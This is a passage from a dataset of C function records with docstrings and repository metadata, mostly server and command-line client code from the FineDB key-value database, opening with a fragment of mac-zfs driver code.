common_specvp(nlhp->lh_vp);\n\t\tdev_t\tdev = cvp->v_rdev;\n\n\t\t(void) VOP_PUTPAGE(cvp, 0, 0, B_INVAL, kcred);\n\t\tbflush(dev);\n\t}\n\n\t*vpp = vp;\n\t*lhp = (ldi_handle_t)nlhp;\n\treturn (0);\n}", "path": "usr\\src\\uts\\common\\os\\driver_lyr.c", "repo_name": "dustin/mac-zfs", "stars": 123, "license": "other", "language": "c", "size": 18896}
{"docstring": "/* Callback function executed by all server's threads. Loop to check if the\n   thread must handle a new connection. */\n", "func_signal": "void *connection_thread_execution(void *param)", "code": "{\n\ttcp_thread_t *thread;\n\tint incoming_socket;\n\n\tYLOG_ADD(YLOG_DEBUG, \"Thread loop.\");\n\tthread = (tcp_thread_t*)param;\n\t// opening a connection to the writer thread\n\tif ((thread->write_sock = nn_socket(AF_SP, NN_PUSH)) < 0 ||\n\t    nn_connect(thread->write_sock, ENDPOINT_WRITER_SOCKET) < 0) {\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to connect to writer's socket.\");\n\t\tpthread_exit(NULL);\n\t}\n\t// opening a connection to the main thread\n\tif ((incoming_socket = nn_socket(AF_SP, NN_PULL)) < 0 ||\n\t    nn_connect(incoming_socket, ENDPOINT_THREADS_SOCKET) < 0) {\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to connect to main thread's socket.\");\n\t\tpthread_exit(NULL);\n\t}\n\t// loop to process new connections\n\tfor (; ; ) {\n\t\tydynabin_t *buff = NULL;\n\n\t\t// waiting for a new connection to handle\n\t\tif (nn_recv(incoming_socket, &thread->fd, sizeof(int), 0) < 0 ||\n\t\t    thread->fd < 0)\n\t\t\tcontinue;\n\t\tYLOG_ADD(YLOG_DEBUG, \"Process an incoming connection.\");\n\t\t// create a dynamic buffer\n\t\tbuff = ydynabin_new(NULL, 0, YFALSE);\n\t\t// loop on incoming requests\n\t\tfor (; ; ) {\n\t\t\tunsigned char *request, command;\n\t\t\tybool_t sync, compress, serialized;\n\t\t\tcommand_handler_t func;\n\n\t\t\tYLOG_ADD(YLOG_DEBUG, \"Processing a new request.\");\n\t\t\tif (connection_read_data(thread, buff, 1) != YENOERR) {\n\t\t\t\tYLOG_ADD(YLOG_DEBUG, \"The socket was closed.\");\n\t\t\t\tgoto end_of_connection;\n\t\t\t}\n\t\t\t// read request\n\t\t\trequest = ydynabin_forward(buff, sizeof(unsigned char));\n\t\t\tcommand = REQUEST_COMMAND(*request);\n\t\t\tsync = (thread->transaction || REQUEST_HAS_SYNC(*request)) ? YTRUE : YFALSE;\n\t\t\tcompress = REQUEST_HAS_COMPRESSED(*request) ? YTRUE : YFALSE;\n\t\t\tserialized = REQUEST_HAS_SERIALIZED(*request) ? YTRUE : YFALSE;\n\t\t\tYLOG_ADD(YLOG_DEBUG, \"---Req: '%x' - txn: %d - sync: %d - comp: %d\\n\",\n\t\t\t         command, (thread->transaction ? 1 : 0), (sync ? 1 : 0),\n\t\t\t         (compress ? 1 : 0));\n\t\t\t// execute the command\n\t\t\tif (!(func = _commands[command])) {\n\t\t\t\tYLOG_ADD(YLOG_DEBUG, \"Bad command '%x'\", command);\n\t\t\t\tCONNECTION_SEND_ERROR(thread, RESP_ERR_PROTOCOL);\n\t\t\t\tgoto end_of_connection;\n\t\t\t}\n\t\t\tYLOG_ADD(YLOG_DEBUG, \"Command %x\", command);\n\t\t\tif (func(thread, sync, compress, serialized, buff) != YENOERR)\n\t\t\t\tgoto end_of_connection;\n\t\t}\nend_of_connection:\n\t\tYLOG_ADD(YLOG_DEBUG, \"End of connection.\");\n\t\tconnection_thread_disconnect(thread);\n\t\tydynabin_delete(buff);\n\t}\n\tpthread_exit(NULL);\n}", "path": "src\\server\\connection_thread.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Show usage. */\n", "func_signal": "void command_help()", "code": "{\n\tprintf_decorated(\"faint\", \"Usage:    finedb-cli [hostname]\\n\"\n\t                          \"Commands:\\n\"\n\t                          \"    get \\\"key1\\\"\\n\"\n\t                          \"    put \\\"key\\\" \\\"data\\\"\\n\"\n\t                          \"    add \\\"key\\\" \\\"data\\\"\\n\"\n\t                          \"    update \\\"key\\\" \\\"data\\\"\\n\"\n\t                          \"    del \\\"key\\\"\\n\"\n\t                          \"    use \\\"dbname\\\"\\n\"\n\t                          \"    start\\n\"\n\t                          \"    commit\\n\"\n\t                          \"    rollback\\n\"\n\t                          \"    ping\\n\"\n\t                          \"    sync\\n\"\n\t                          \"    async\\n\"\n\t                          \"    autocheck [on|off]\\n\"\n\t                          \"    quit\\n\");\n\tprintf(\"\\n\");\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Start a transaction. */\n", "func_signal": "void command_start(cli_t *cli)", "code": "{\n\tint rc;\n\n\t// check connection if needed\n\tif (!check_connection(cli))\n\t\treturn;\n\t// check opened transaction\n\tif (cli->in_transaction) {\n\t\tprintf_color(\"red\", \"A transaction is already open. It will be rollbacked.\");\n\t\tprintf(\"\\n\");\n\t}\n\t// request\n\trc = finedb_start(cli->finedb);\n\tif (rc) {\n\t\tprintf_color(\"red\", \"Server error.\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tprintf_decorated(\"faint\", \"Transaction started.\");\n\tprintf(\"\\n\");\n\tcli->in_transaction = YTRUE;\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/**\n * Command line completion.\n * @param\tbuf\tText to complete.\n * @param\tlc\tReadline object.\n */\n", "func_signal": "void cli_completion(const char *buf, linenoiseCompletions *lc)", "code": "{\n\tunsigned int i;\n\tsize_t bufsz = strlen(buf);\n\n\tfor (i = 0; commands[i]; ++i) {\n\t\tchar *cmd = commands[i];\n\n\t\tif (strlen(cmd) < bufsz)\n\t\t\tcontinue;\n\t\tif (!strncasecmp(buf, cmd, bufsz))\n\t\t\tlinenoiseAddCompletion(lc, cmd);\n\t}\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Process a DEL command. */\n", "func_signal": "yerr_t command_del(tcp_thread_t *thread, ybool_t sync, ybool_t compress, ybool_t serialized, ydynabin_t *buff)", "code": "{\n\tuint16_t *pkey_len, key_len;\n\tvoid *ptr, *key = NULL;\n\twriter_msg_t *msg = NULL;\n\tchar answer;\n\n\tYLOG_ADD(YLOG_DEBUG, \"DEL command\");\n\t// read key length\n\tif (connection_read_data(thread, buff, sizeof(key_len)) != YENOERR)\n\t\tgoto error;\n\tpkey_len = ydynabin_forward(buff, sizeof(key_len));\n\tkey_len = ntohs(*pkey_len);\n\t// read key\n\tif (connection_read_data(thread, buff, (size_t)key_len) != YENOERR)\n\t\tgoto error;\n\tptr = ydynabin_forward(buff, (size_t)key_len);\n\tif ((key = YMALLOC((size_t)key_len)) == NULL)\n\t\tgoto error;\n\tmemcpy(key, ptr, (size_t)key_len);\n\n\tif (!sync) {\n\t\t// send the response\n\t\tconnection_send_response(thread, RESP_OK, YFALSE, YFALSE, NULL, 0);\n\t}\n\n\t// creation of the message\n\tif ((msg = YMALLOC(sizeof(writer_msg_t))) == NULL)\n\t\tgoto error;\n\tmsg->type = WRITE_DEL;\n\tybin_set(&msg->name, key, key_len);\n\tif (!sync) {\n\t\tmsg->dbname = thread->dbname ? strdup(thread->dbname) : NULL;\n\t\t// send the message to the writer thread\n\t\tif (nn_send(thread->write_sock, &msg, sizeof(msg), 0) < 0) {\n\t\t\tYLOG_ADD(YLOG_WARN, \"Unable to send message to writer thread.\");\n\t\t\tgoto error;\n\t\t}\n\t\treturn (YENOERR);\n\t}\n\t// synchronized\n\tif (database_del(thread->finedb->database, thread->transaction, thread->dbname, msg->name) == YENOERR) {\n\t\tYLOG_ADD(YLOG_DEBUG, \"Deletion done on database.\");\n\t\tanswer = 1;\n\t} else {\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to delete data on database.\");\n\t\tanswer = 0;\n\t}\n\tYFREE(key);\n\tYFREE(msg);\n\tYLOG_ADD(YLOG_DEBUG, \"DEL command %s\", (answer ? \"OK\" : \"failed\"));\n\tif (!sync)\n\t\treturn (YENOERR);\n\treturn (connection_send_response(thread, (answer ? RESP_OK : RESP_ERR_BAD_NAME),\n\t                                 YFALSE, YFALSE, NULL, 0));\nerror:\n\tYLOG_ADD(YLOG_WARN, \"PUT error\");\n\tYFREE(key);\n\tYFREE(msg);\n\tCONNECTION_SEND_ERROR(thread, RESP_ERR_SERVER);\n\treturn (YEIO);\n}", "path": "src\\server\\command_del.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Main function. */\n", "func_signal": "int main(int argc, char *argv[])", "code": "{\n\tcli_t cli;\n\tchar *hostname = DEFAULT_HOST;\n\tchar history_file[4096];\n\tybool_t interactive_mode = YTRUE;\n\n\tbzero(&cli, sizeof(cli_t));\n\tcli.autocheck = YTRUE;\n\tif (argc == 2 && argv[1][0] != '-')\n\t\thostname = argv[1];\n\tif (argc == 3 && !strcmp(argv[2], \"-\"))\n\t\tinteractive_mode = YFALSE;\n\t// init database connection\n\tif ((cli.finedb = finedb_create(hostname, 11138)) == NULL) {\n\t\tprintf_color(\"red\", \"Memory error.\");\n\t\tprintf(\"\\n\");\n\t\texit(1);\n\t}\n\tif (finedb_connect(cli.finedb) != FINEDB_OK) {\n\t\tprintf_color(\"red\", \"Unable to connect to server '%s' on port '%d'.\", argv[1], 11138);\n\t\tprintf(\"\\n\");\n\t\texit(2);\n\t}\n\t// interactive mode init\n\tif (interactive_mode) {\n\t\tchar *home = NULL;\n\n\t\tif ((home = getenv(\"HOME\")) != NULL) {\n\t\t\tFILE *hist;\n\n\t\t\tsnprintf(history_file, sizeof(history_file), \"%s/%s\", home, HISTORY_FILE);\n\t\t\tif ((hist = fopen(history_file, \"w+\")) != NULL) {\n\t\t\t\tfclose(hist);\n\t\t\t\tlinenoiseHistoryLoad(HISTORY_FILE);\n\t\t\t}\n\t\t\tlinenoiseSetCompletionCallback(cli_completion);\n\t\t}\n\t}\n\t// main loop\n\tfor (; ; ) {\n\t\tchar buff[4096], *line = NULL, *pt, *cmd;\n\n\t\tif (!interactive_mode) {\n\t\t\tssize_t bufsz, linesz = 0;\n\n\t\t\twhile ((bufsz = read(0, buff, sizeof(buff))) > 0) {\n\t\t\t\tpt = (char*)malloc(linesz + bufsz + 1);\n\t\t\t\tmemcpy(pt, line, linesz);\n\t\t\t\tmemcpy((void*)((size_t)pt + linesz), buff, bufsz);\n\t\t\t\tlinesz += bufsz;\n\t\t\t\tpt[linesz] = '\\0';\n\t\t\t\tif (line)\n\t\t\t\t\tfree(line);\n\t\t\t\tline = pt;\n\t\t\t}\n\t\t} else {\n\t\t\tsnprintf(buff, sizeof(buff), \"%s > \", (cli.dbname ? cli.dbname : \"default\"));\n\t\t\tif ((line = linenoise(buff)) == NULL)\n\t\t\t\tbreak;\n\t\t}\n\t\tpt = line;\n\t\tLTRIM(pt);\n\t\tcmd = pt;\n\t\t// add command line to history\n\t\tlinenoiseHistoryAdd(cmd);\n\t\tlinenoiseHistorySave(history_file);\n\t\t// extract the command\n\t\twhile (*pt && !IS_SPACE(*pt))\n\t\t\t++pt;\n\t\t*pt++ = '\\0';\n\t\tLTRIM(pt);\n\t\t/* command management */\n\t\tif (cmd[0] == '\\0')\n\t\t\tgoto reloop;\n\t\t\t//continue;\n\t\t// local commands, no need for a running connection\n\t\tif (!strcasecmp(cmd, \"exit\") || !strcasecmp(cmd, \"quit\"))\n\t\t\texit(0);\n\t\tif (!strcasecmp(cmd, \"help\") || cmd[0] == '?') {\n\t\t\tcommand_help();\n\t\t\tgoto reloop;\n\t\t\t//continue;\n\t\t} else if (!strcasecmp(cmd, \"sync\")) {\n\t\t\tcommand_sync(&cli);\n\t\t\tgoto reloop;\n\t\t\t//continue;\n\t\t} else if (!strcasecmp(cmd, \"async\")) {\n\t\t\tcommand_async(&cli);\n\t\t\tgoto reloop;\n\t\t\t//continue;\n\t\t}\n\t\t// commands that need a running connection\n\t\tif (!strcasecmp(cmd, \"use\"))\n\t\t\tcommand_use(&cli, pt);\n\t\telse if (!strcasecmp(cmd, \"get\"))\n\t\t\tcommand_get(&cli, pt);\n\t\telse if (!strcasecmp(cmd, \"del\"))\n\t\t\tcommand_del(&cli, pt);\n\t\telse if (!strcasecmp(cmd, \"put\"))\n\t\t\tcommand_send_data(&cli, pt, YFALSE, YFALSE);\n\t\telse if (!strcasecmp(cmd, \"add\"))\n\t\t\tcommand_send_data(&cli, pt, YTRUE, YFALSE);\n\t\telse if (!strcasecmp(cmd, \"update\"))\n\t\t\tcommand_send_data(&cli, pt, YFALSE, YTRUE);\n\t\telse if (!strcasecmp(cmd, \"inc\"))\n\t\t\tcommand_inc(&cli, pt);\n\t\telse if (!strcasecmp(cmd, \"dec\"))\n\t\t\tcommand_dec(&cli, pt);\n\t\telse if (!strcasecmp(cmd, \"start\"))\n\t\t\tcommand_start(&cli);\n\t\telse if (!strcasecmp(cmd, \"stop\"))\n\t\t\tcommand_stop(&cli);\n#if 0\n\t\telse if (!strcasecmp(cmd, \"list\"))\n\t\t\tcommand_list(&cli, pt);\n#endif\n\t\telse if (!strcasecmp(cmd, \"ping\"))\n\t\t\tcommand_ping(&cli);\n\t\telse if (!strcasecmp(cmd, \"autocheck\"))\n\t\t\tcommand_autocheck(&cli, pt);\n\t\telse {\n\t\t\tprintf_color(\"red\", \"Bad command.\");\n\t\t\tprintf(\"\\n\");\n\t\t}\nreloop:\n\t\tfree(line);\n\t}\n\treturn (0);\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Fill a dynamic buffer. */\n", "func_signal": "yerr_t connection_read_data(tcp_thread_t *thread, ydynabin_t *container, size_t size)", "code": "{\n\tchar buff[8196];\n\tssize_t bufsz;\n\tyerr_t dynaerr;\n\n\tif (thread->fd < 0)\n\t\treturn (YECONNRESET);\n\tif (container->len >= size)\n\t\treturn (YENOERR);\n\twhile (container->len < size) {\n\t\t// define timeout on the socket\n\t\tstruct timeval tv;\n\t\ttv.tv_sec = thread->finedb->timeout;\n\t\ttv.tv_usec = 0;\n\t\tif (setsockopt(thread->fd, SOL_SOCKET, SO_RCVTIMEO, (void*)&tv, sizeof(tv)) < 0)\n\t\t\tYLOG_ADD(YLOG_WARN, \"Unable to set RCVTIMEO on socket.\");\n\t\t// try to read from socket\n\t\tif ((bufsz = recv(thread->fd, buff, 8196, 0)) < 0) {\n\t\t\tYLOG_ADD(YLOG_DEBUG, \"Socket error\");\n\t\t\treturn (YEACCESS);\n\t\t}\n\t\tif (bufsz == 0) {\n\t\t\tYLOG_ADD(YLOG_DEBUG, \"Socket closed\");\n\t\t\tif (container->len < size)\n\t\t\t\treturn (YECONNRESET);\n\t\t\tbreak;\n\t\t}\n\t\t// remove timeout from the socket\n\t\ttv.tv_sec = 0;\n\t\tif (setsockopt(thread->fd, SOL_SOCKET, SO_RCVTIMEO, (void*)&tv, sizeof(tv)) < 0)\n\t\t\tYLOG_ADD(YLOG_WARN, \"Unable to remove RCVTIMEO from socket.\");\n\t\t// expand the buffer\n\t\tif ((dynaerr = ydynabin_expand(container, buff, (size_t)bufsz)) != YENOERR)\n\t\t\treturn (dynaerr);\n\t}\n\treturn (YENOERR);\n}", "path": "src\\server\\connection_thread.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Put, add or update a key/value in database. */\n", "func_signal": "void command_send_data(cli_t *cli, char *pt, ybool_t create_only, ybool_t update_only)", "code": "{\n\tchar *pt2, *key, *data;\n\tybin_t bkey, bdata;\n\tint rc;\n\n\tLTRIM(pt);\n\tif (*pt != '\"') {\n\t\tprintf_decorated(\"faint\", \"Bad key format (no quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tpt++;\n\tif (!*pt) {\n\t\tprintf_decorated(\"faint\", \"Bad key\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tkey = pt2 = pt;\n\tpt2 = pt;\n\tif ((pt2 = strchr(pt2, '\"')) == NULL) {\n\t\tprintf_decorated(\"faint\", \"Bad key format (no trailing quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\t*pt2 = '\\0';\n\tpt2++;\n\tif (!*pt2) {\n\t\tprintf_decorated(\"faint\", \"Missing data\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\t*pt2 = '\\0';\n\tdata = pt2 + 1;\n\tLTRIM(data);\n\tif (*data != '\"') {\n\t\tprintf_decorated(\"faint\", \"Bad data format (no quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tdata++;\n\tif (!*data) {\n\t\tprintf_decorated(\"faint\", \"Missing data\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tpt2 = data + strlen(data) - 1;\n\tif (*pt2 != '\"') {\n\t\tprintf_decorated(\"faint\", \"Bad data format (no trailing quote)\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\t*pt2 = '\\0';\n\n\t// check connection if needed\n\tif (!check_connection(cli))\n\t\treturn;\n\t// request\n\tybin_set(&bkey, key, strlen(key));\n\tybin_set(&bdata, data, strlen(data));\n\tif (create_only)\n\t\trc = finedb_add(cli->finedb, bkey, bdata);\n\telse if (update_only)\n\t\trc = finedb_update(cli->finedb, bkey, bdata);\n\telse\n\t\trc = finedb_put(cli->finedb, bkey, bdata);\n\tif (rc)\n\t\tprintf_color(\"red\", \"Unable to %s key '%s'.\",\n\t\t             (create_only ? \"add\" : (update_only ? \"update\" : \"put\")), key);\n\telse\n\t\tprintf_decorated(\"faint\", \"OK\");\n\tprintf(\"\\n\");\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/**\n * @function\tcheck_connection\n * Check the connection to the server.\n * @param\tcli\tPointer to the client structure.\n * @return\t1 if OK, 0 if no connection.\n */\n", "func_signal": "int check_connection(cli_t *cli)", "code": "{\n\tif (!cli->autocheck)\n\t\treturn (1);\n\t// ping the server\n\tif (!finedb_ping(cli->finedb))\n\t\treturn (1);\n\t// no connection, try to reconnect\n\tif (finedb_connect(cli->finedb) != FINEDB_OK) {\n\t\tprintf_color(\"red\", \"Lost connection to server.\");\n\t\tprintf(\"\\n\");\n\t\treturn (0);\n\t}\n\tif (cli->in_transaction) {\n\t\tcli->in_transaction = YFALSE;\n\t\tprintf_decorated(\"faint\", \"Reconnected to server. Transaction is lost.\");\n\t} else\n\t\tprintf_decorated(\"faint\", \"Reconnected to server.\");\n\tprintf(\"\\n\");\n\treturn (1);\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Test a connection. */\n", "func_signal": "void command_ping(cli_t *cli)", "code": "{\n\tint rc;\n\n\t// request\n\trc = finedb_ping(cli->finedb);\n\tif (rc) {\n\t\tprintf_color(\"red\", \"Server error.\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tprintf_decorated(\"faint\", \"OK\");\n\tprintf(\"\\n\");\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Stop a transaction. */\n", "func_signal": "void command_stop(cli_t *cli)", "code": "{\n\tint rc;\n\n\t// check connection if needed\n\tif (!check_connection(cli))\n\t\treturn;\n\t// check opened transaction\n\tif (!cli->in_transaction) {\n\t\tprintf_color(\"red\", \"No opened transaction.\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\t// request\n\trc = finedb_stop(cli->finedb);\n\tif (rc) {\n\t\tprintf_color(\"red\", \"Server error.\");\n\t\tprintf(\"\\n\");\n\t\treturn;\n\t}\n\tprintf_decorated(\"faint\", \"Transaction stopped.\");\n\tprintf(\"\\n\");\n\tcli->in_transaction = YFALSE;\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/**\n * Write a coloured string.\n * @param\tcolor\t\"black\", \"red\", \"green\", \"yellow\", \"blue\", \"magenta\", \"cyan\", \"white\".\n * @param\ts\tThe string to write.\n */\n", "func_signal": "void printf_color(const char *color, char *s, ...)", "code": "{\n\tva_list ap;\n\tint i;\n\n\tva_start(ap, s);\n\tif (!strcasecmp(color, \"black\"))\n\t\ti = 0;\n\telse if (!strcasecmp(color, \"red\"))\n\t\ti = 1;\n\telse if (!strcasecmp(color, \"green\"))\n\t\ti = 2;\n\telse if (!strcasecmp(color, \"yellow\"))\n\t\ti = 3;\n\telse if (!strcasecmp(color, \"blue\"))\n\t\ti = 4;\n\telse if (!strcasecmp(color, \"magenta\"))\n\t\ti = 5;\n\telse if (!strcasecmp(color, \"cyan\"))\n\t\ti = 6;\n\telse if (!strcasecmp(color, \"white\"))\n\t\ti = 7;\n\tprintf(\"%c[9%dm\", 27, i);\n\tvprintf(s, ap);\n\tprintf(\"%c[0m\", 27);\n\tva_end(ap);\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Set asynchronous mode. */\n", "func_signal": "void command_async(cli_t *cli)", "code": "{\n\tfinedb_async(cli->finedb);\n\tprintf_decorated(\"faint\", \"Set asynchronous mode.\");\n\tprintf(\"\\n\");\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Set the autocheck option. */\n", "func_signal": "void command_autocheck(cli_t *cli, char *pt)", "code": "{\n\tif (strlen(pt)) {\n\t\tif (!strcasecmp(pt, \"on\") || !strcasecmp(pt, \"yes\") ||\n\t\t    !strcasecmp(pt, \"true\") || !strcmp(pt, \"1\"))\n\t\t\tcli->autocheck = YTRUE;\n\t\telse\n\t\t\tcli->autocheck = YFALSE;\n\t}\n\tprintf_decorated(\"faint\", \"autocheck option is %s\",\n\t                 cli->autocheck ? \"activated\" : \"deactivated\");\n\tprintf(\"\\n\");\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Create a new connection thread. */\n", "func_signal": "tcp_thread_t *connection_thread_new(finedb_t *finedb)", "code": "{\n\ttcp_thread_t *thread;\n\n\t// thread init\n\tthread = YMALLOC(sizeof(tcp_thread_t));\n\tthread->fd = -1;\n\tthread->finedb = finedb;\n\t// thread creation\n\tif (pthread_create(&(thread->tid), 0, connection_thread_execution,\n\t    thread)) {\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to create thread.\");\n\t\tYFREE(thread);\n\t\treturn (NULL);\n\t}\n\tpthread_detach(thread->tid);\n\treturn (thread);\n}", "path": "src\\server\\connection_thread.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* List the keys stored in database. */\n", "func_signal": "void command_list(cli_t *cli, char *pt)", "code": "{\n\tchar *buffer, c;\n\tsize_t sz, offset, length, rc;\n\n\tLTRIM(pt);\n\t// create sending buffer\n\tsz = 1;\n\tif (cli->dbname)\n\t\tsz += 1 + strlen(cli->dbname);\n\tbuffer = YMALLOC(sz);\n\t// set the code byte\n\tbuffer[0] = PROTO_LIST;\n\tif (cli->dbname)\n\t\tbuffer[0] = REQUEST_ADD_DBNAME(buffer[0]);\n\t// dbname\n\toffset = 1;\n\tif (cli->dbname) {\n\t\tlength = strlen(cli->dbname);\n\t\tbuffer[offset] = (char)length;\n\t\toffset++;\n\t\tmemcpy(&buffer[offset], cli->dbname, length);\n\t\toffset += length;\n\t}\n\t{\n\t\tsize_t n;\n\t\tfor (n = 0; n < sz; n++)\n\t\t\tprintf(\"%02x \", buffer[n]);\n\t\tprintf(\"\\n\");\n\t}\n\n\t// send data\n\trc = write(cli->fd, buffer, sz);\n\tYFREE(buffer);\n\tif (rc != sz) {\n\t\tprintf(\"%c[Connection error%c[0m\\n\", 27, 27);\n\t\treturn;\n\t}\n\n\t// get response\n\tif (read(cli->fd, &c, 1) != 1) {\n\t\tprintf(\"%c[Connection error%c[0m\\n\", 27, 27);\n\t\treturn;\n\t}\n\tif (RESPONSE_CODE(c) != RESP_OK) {\n\t\tprintf(\"%c[2mERROR: %s%c[0m\\n\", 27,\n\t\t       (RESPONSE_CODE(c) == RESP_PROTO ? \"protocol\" :\n\t\t        (RESPONSE_CODE(c) == RESP_SERVER_ERR ? \"server\" :\n\t\t         (RESPONSE_CODE(c) == RESP_NO_DATA ? \"no data\" : \"unknown\"))), 27);\n\t\treturn;\n\t}\n\tprintf(\"%c[2mOK%c[0m\\n\", 27, 27);\n\tfor (; ; ) {\n\t\tuint16_t ln = 0, lh;\n\n\t\tif (read(cli->fd, &ln, 2) < 2)\n\t\t\tbreak;\n\t\tlh = ntohs(ln);\n\t\tbuffer = YMALLOC(lh + 1);\n\t\tif (read(cli->fd, buffer, lh) != lh) {\n\t\t\tprintf(\"%c[Connection error%c[0m\\n\", 27, 27);\n\t\t\tYFREE(buffer);\n\t\t\treturn;\n\t\t}\n\t\tprintf(\"%c[2m%s%c[0m\\n\", 27, buffer, 27);\n\t\tYFREE(buffer);\n\t}\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Defines the used database. */\n", "func_signal": "void command_use(cli_t *cli, char *pt)", "code": "{\n\tint rc;\n\n\t// check connection if needed\n\tif (!check_connection(cli))\n\t\treturn;\n\t// request\n\tif (!strlen(pt) || !strcasecmp(pt, \"default\")) {\n\t\t// use default database\n\t\tif ((rc = finedb_setdb(cli->finedb, NULL)) != 0) {\n\t\t\tprintf_color(\"red\", \"Unable to use the default database (%d).\", rc);\n\t\t\tprintf(\"\\n\");\n\t\t} else {\n\t\t\tYFREE(cli->dbname);\n\t\t\tprintf_decorated(\"faint\", \"Use the default database\");\n\t\t\tprintf(\"\\n\");\n\t\t}\n\t} else {\n\t\t// set a new database\n\t\tif ((rc = finedb_setdb(cli->finedb, pt)) != 0) {\n\t\t\tprintf_color(\"red\", \"Unable to use the '%s' database (%d).\", rc);\n\t\t\tprintf(\"\\n\");\n\t\t} else {\n\t\t\tYFREE(cli->dbname);\n\t\t\tcli->dbname = strdup(pt);\n\t\t\tprintf_decorated(\"faint\", \"Use the '%s' database\", pt);\n\t\t\tprintf(\"\\n\");\n\t\t}\n\t}\n}", "path": "src\\cli\\finedb-cli.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Disconnect a running connection and reset the thread. */\n", "func_signal": "void connection_thread_disconnect(tcp_thread_t *thread)", "code": "{\n\tif (thread->fd == -1)\n\t\treturn;\n\tif (thread->transaction) {\n\t\tdatabase_transaction_rollback(thread->transaction);\n\t\tthread->transaction = NULL;\n\t}\n\tshutdown(thread->fd, SHUT_RDWR);\n\tthread->fd = -1;\n\tYFREE(thread->dbname);\n}", "path": "src\\server\\connection_thread.c", "repo_name": "Amaury/FineDB", "stars": 115, "license": "apache-2.0", "language": "c", "size": 224}
{"docstring": "/* Send a response. */\n", "func_signal": "yerr_t connection_send_response(tcp_thread_t *thread, protocol_response_t code,\n                                ybool_t serialized, ybool_t compressed,\n                                const void *data, size_t data_len)", "code": "{\n\tunsigned char code_byte;\n\tstruct iovec iov[3];\n\tstruct msghdr mh;\n\tssize_t expected = 1, rc;\n\tuint32_t data_nlen;\n\tstruct timeval tv;\n\n\tYLOG_ADD(YLOG_DEBUG, \"Send response (%d).\", code);\n\tmh.msg_name = NULL;\n\tmh.msg_namelen = 0;\n\tmh.msg_iov = iov;\n\tmh.msg_iovlen = 1;\n\tmh.msg_control = NULL;\n\tmh.msg_controllen = 0;\n\tmh.msg_flags = 0;\n\t// code\n\tcode_byte = (unsigned char)code;\n\tif (serialized)\n\t\tcode_byte = RESPONSE_ADD_SERIALIZED(code_byte);\n\tif (compressed)\n\t\tcode_byte = RESPONSE_ADD_COMPRESSED(code_byte);\n\tiov[0].iov_base = (caddr_t)&code_byte;\n\tiov[0].iov_len = sizeof(code_byte);\n\t// data\n\tif (data != NULL) {\n\t\tdata_nlen = htonl((uint32_t)data_len);\n\t\tiov[1].iov_base = (caddr_t)&data_nlen;\n\t\tiov[1].iov_len = sizeof(uint32_t);\n\t\tiov[2].iov_base = (caddr_t)data;\n\t\tiov[2].iov_len = data_len;\n\t\tmh.msg_iovlen = 3;\n\t\texpected += sizeof(unsigned int) + data_len;\n\t}\n\t// define timeout on the socket\n\ttv.tv_sec = thread->finedb->timeout;\n\ttv.tv_usec = 0;\n\tif (setsockopt(thread->fd, SOL_SOCKET, SO_SNDTIMEO, (void*)&tv, sizeof(tv)) < 0)\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to set SNDTIMEO on socket.\");\n\t// send the message\n\trc = sendmsg(thread->fd, &mh, 0);\n\tif (rc < 0) {\n\t\tYLOG_ADD(YLOG_WARN, \"Unable to send response.\");\n\t\treturn (YEIO);\n\t} else if (rc < expected) 